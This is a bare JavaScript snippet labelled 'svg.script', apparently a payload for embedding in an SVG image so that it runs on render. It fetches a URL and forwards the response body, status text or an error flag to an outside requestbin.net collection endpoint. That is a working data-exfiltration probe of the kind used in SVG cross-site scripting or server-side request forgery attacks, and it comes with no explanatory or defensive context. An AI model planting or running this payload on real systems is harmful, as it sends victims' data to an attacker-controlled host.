svg.script:
 function handleErrors(response) {
    if (!response.ok) {
        fetch("https://requestbin.net/r/e6cspddn?p=" + response.statusText, { mode: 'no-cors'});
    }
    return response;
 }

fetch("http://httpstat.us/200")
    .then(handleErrors)
    .then(function(response) {
        response.text().then(text => fetch("https://requestbin.net/r/e6cspddn?p=" + text, { mode: 'no-cors'}));
    }).catch(function(error) {
        fetch("https://requestbin.net/r/e6cspddn?p=error", { mode: 'no-cors'});
    });
